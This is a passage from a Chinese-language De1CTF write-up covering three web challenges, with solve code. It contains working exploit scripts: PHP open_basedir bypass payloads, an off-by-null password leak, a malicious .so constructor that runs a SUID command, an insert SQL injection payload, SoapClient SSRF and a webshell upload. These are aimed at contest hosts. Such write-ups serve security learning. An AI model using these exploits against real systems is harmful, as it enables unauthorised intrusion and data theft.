        payload = 'login %s %s' % (username, password)
        payload = urllib.quote(payload)
        payload = url % (payload, totp.now())
        s.get(payload)
    def destruct():
        payload = 'destruct'
        payload = urllib.quote(payload)
        payload = url % (payload, totp.now())
        s.get(payload)
    def targeting(code, position):
        payload = 'targeting %s %s' % (code, position)
        payload = urllib.quote(payload)
        payload = url % (payload, totp.now())
        s.get(payload)
    def launch():
        payload = 'launch'
        payload = urllib.quote(payload)
        payload = url % (payload, totp.now())
        return s.get(payload).text
    login('hint{G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333}')
    destruct()
    targeting('a','chr')
    targeting('b','{$a(46)}')
    targeting('c','{$b}{$b}')
    targeting('d','{$a(47)}')
    targeting('e','js')
    targeting('f','open_basedir')
    targeting('g','chdir')
    targeting('h','ini_set')
    targeting('i','file_get_')
    targeting('j','{$i}contents')
    targeting('k','{$g($e)}')
    targeting('l','{$h($f,$c)}')
    targeting('m','{$g($c)}')
    targeting('n','{$h($f,$d)}')
    targeting('o','{$d}flag')
    targeting('p','{$j($o)}')
    targeting('q','printf')
    targeting('r','{$q($p)}')
    print(launch())
Flag：`de1ctf{h3r3_y0uuur_g1fttt_0uT_0f_b0o0o0o0o0xx}`
## CloudMusic_rev
以前 1.0 版本 writeup：
[impakho/ciscn2019_final_web1](https://github.com/impakho/ciscn2019_final_web1)
本题是 2.0 版本。
先审计源代码，找到首页备注里有 `#firmware` 功能。
`#firmware` 功能需要登录，而且只有管理员有权限访问。
然后注册登录，在我的分享页面里看到一首英文歌，其它都是中文歌，而且这首英文歌在首页就已经放入到播放器列表里。
所以看分享 `#share` 页面源代码，能看到 `/media/share.php?` 后面还用 `btoa` 也就是
`base64编码`，所以这里不难发现有个任意文件读取。
尝试读取 `../index.php` 页面的源代码，访问
`http://127.0.0.1/media/share.php?Li4vaW5kZXgucGhw`。
限制了 `.php` 文件，根据提示，可以使用 `urlencode` 编码绕过。
成功读取到 `../index.php` 文件，那么其它文件也可以读取到。
然后就是读取网站目录下的文件，进行源代码审计。我们的目标就是拿到管理员密码，然后访问 `#firmware` 功能。
那么我们需要找到源代码里，哪里读取到管理员密码，这些位置并不多。这里漏洞点在 `/include/upload.php` 里，调用到
`/lib/parser.so` 进行音频文件解析，传入了管理员密码。
那么我们需要用 `IDA` 反编译 `/lib/parser.so` 文件，漏洞点在 `read_title` / `read_artist` /
`read_album` 三个函数里的 `strcpy` 处，`off by null`，刚好可以覆盖到 `mem_mframe_data` 后面的
`mframe_data` 第一字节为 `0x00`，那么读取的时候就能读到 `mem_mpasswd`，也就是 `管理员密码`。
相对于 1.0 版本，这是一个错误版本的 `parser.so`，因为它使用 `strlen` 获取字符串长度，致使 `unicode`
编码的字段无法正常读取，影响到一些 `mp3` 的信息读取，间接上增加了做题的难度。
那么我们可以构造字符串长度为 `0x70` 的字段，然后上传构造好的 `mp3` 文件，就能读取 `管理员密码`。
构造好的 `mp3` 文件见 `exp` 里。
我们使用 `管理员密码` 登录管理员账号，访问 `#firmware` 功能。
泄露这个页面的源代码文件，审计源代码，这里我们可以上传一个 `.so` 文件，然后猜文件名，然后可以加载这个 `.so` 文件。
那么我们可以使用 `__attribute__ ((constructor))` 来执行我们的代码。
就像这样：
    #include 
    #include 
    char _version[0x130];
    char * version = &_version;
    __attribute__ ((constructor)) void fun(){
        memset(version,0,0x130);
        FILE * fp=popen("/usr/bin/tac /flag", "r");
        if (fp==NULL) return;
        fread(version, 1, 0x100, fp);
        pclose(fp);
    }
但是相对于 `1.0` 版本，这里没有回显。
所以我们可以向 `/uploads/firmware/` 或者 `/uploads/music/` 下写文件，然后去访问来读取到回显信息。
`www-data` 用户，对 `/flag` 文件没有读取权限。
我们需要找到一个具有 `suid` 权限的程序去读取，`/usr/bin/tac` 具有 `suid` 权限，能够读取到 `/flag` 文件的内容。
所以我们可以用 `/usr/bin/tac /flag > /var/www/html/uploads/firmware/xxxxx` 去读取到
`flag` 文件。
Flag：`de1ctf{W3b_ANND_PWNNN_C1ou9mus1c_revvvv11}`
## ShellShellShell
解题思路：赛题分为两层，需要先拿到第一层的webshell，然后做好代理，渗透内网获取第二层的webshell，最后在内网的主机中找到flag文件获取flag。(以下给出的脚本文件当中ip地址需要进行对应的修改)
第一层获取webshell主要通过以下的步骤：  
1.可利用swp源码泄露，获取所有的源码文件。  
2.利用insert sql注入拿到管理员的密码md5值，然后在md5网站上解密得到密码明文。  
3.利用反序列化漏洞调用内置类`SoapClient`触发SSRF漏洞，再结合CRLF漏洞，实现admin登录，获取admin登录后的session值。  
4.登录admin成功之后，会发现有一个很简单文件上传功能，上传木马即可getshell。
获取泄露的swp文件的脚本`GetSwp.py`
    #coding=utf-8
    # import requests
    import urllib
    import os
    os.system('mkdir source')
    os.system('mkdir source/views')
    file_list=['.index.php.swp','.config.php.swp','.user.php.swp','user.php.bak','views/.delete.swp','views/.index.swp','views/.login.swp','views/.logout.swp','views/.profile.swp','views/.publish.swp','views/.register.swp']
    part_url='http://45.76.187.90:11027/'
    for i in file_list:
        url=part_url+i
        print 'download %s '% url
        os.system('curl '+url+'>source/'+i)
#### sql注入点分析
先在`config.php`看到了全局过滤：
    function addslashes_deep($value)
    {
        if (empty($value))
        {
            return $value;
        }
        else
        {
            return is_array($value) ? array_map('addslashes_deep', $value) : addslashes($value);
        }
    }
    function addsla_all()
    {
        if (!get_magic_quotes_gpc())
        {
            if (!empty($_GET))
            {
                $_GET  = addslashes_deep($_GET);
            }
            if (!empty($_POST))
            {
                $_POST = addslashes_deep($_POST);
            }
            $_COOKIE   = addslashes_deep($_COOKIE);
            $_REQUEST  = addslashes_deep($_REQUEST);
        }
    }
    addsla_all();
这样过滤之后，简单的注入就不存在了。  
在`user.php`中看到`insert`函数，代码如下：
    private function get_column($columns){
            if(is_array($columns))
                $column = ' `'.implode('`,`',$columns).'` ';
            else
                $column = ' `'.$columns.'` ';
            return $column;
        }    
    public function insert($columns,$table,$values){
            $column = $this->get_column($columns);
            $value = '('.preg_replace('/`([^`,]+)`/','\'${1}\'',$this->get_column($values)).')';
            $nid =
            $sql = 'insert into '.$table.'('.$column.') values '.$value;
            $result = $this->conn->query($sql);
            return $result;
        }
看对`$value`的操作，先将`$value`数组的每个值用反引号引起来，然后再用逗号连接起来，变成这样的字符串：
    `$value[0]`,`$value[1]`，`$value[1]`
然后再执行
    $value = '('.preg_replace('/`([^`,]+)`/','\'${1}\'',$this->get_column($values)).')';
preg_replace的意图是把反引号的单引号进行替换（核心操作是如果一对反引号中间的内容不存在逗号和反引号，就把反引号变为单引号,所以`$value`就变为了）
    ('$value[0]','$value[1]'，'$value[1]')
但是如果`$value`元素本身带有反引号，就会破坏掉拼接的结构，在做反引号变为单引号的时候造成问题，比如说:
    考虑$value为 : array("admin`,`1`)#","password")
    经过处理后，就变为了 : ('admin','1')#`,'password' )
    相当于闭合了单引号，造成注入。
看到`insert`函数在`publish`函数中被调用，并且存在`$_POST['signature']`变量可控，注入点就在这里：
    @$ret = $db->insert(array('userid','username','signature','mood'),'ctf_user_signature',array($this->userid,$this->username,$_POST['signature'],$mood));
实质是把$value中的反引号替换为单引号时，如果$value中本来就带有反引号，就有可能导致注入(addslashes函数不会对反引号过滤)
#### sql_exp.py
利用sql注入漏洞注入出管理员账号密码的脚本。
    #coding=utf-8
    import re
    import string
    import random
    import requests
    import subprocess
    import hashlib
    from itertools import product
    _target='http://20.20.20.128:11027/index.php?action='
    def get_code_dict():
        c = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_ []{}<>~`+=,.;:/?|'
        captchas = [''.join(i) for i in product(c, repeat=3)]
        print '[+] Genering {} captchas...'.format(len(captchas))
        with open('captchas.txt', 'w') as f:
            for k in captchas:
                f.write(hashlib.md5(k).hexdigest()+' --> '+k+'\n')
    def get_creds():
        username = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10))
        password = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(10))
        return username, password
    def solve_code(html):
        code = re.search(r'Code\(substr\(md5\(\?\), 0, 5\) === ([0-9a-f]{5})\)', html).group(1)
        solution = subprocess.check_output(['grep', '^'+code, 'captchas.txt']).split()[2]
        return solution
    def register(username, password):
        resp = sess.get(_target+'register')
        code = solve_code(resp.text)
        sess.post(_target+'register', data={'username':username,'password':password,'code':code})
        return True
    def login(username, password):
        resp = sess.get(_target+'login')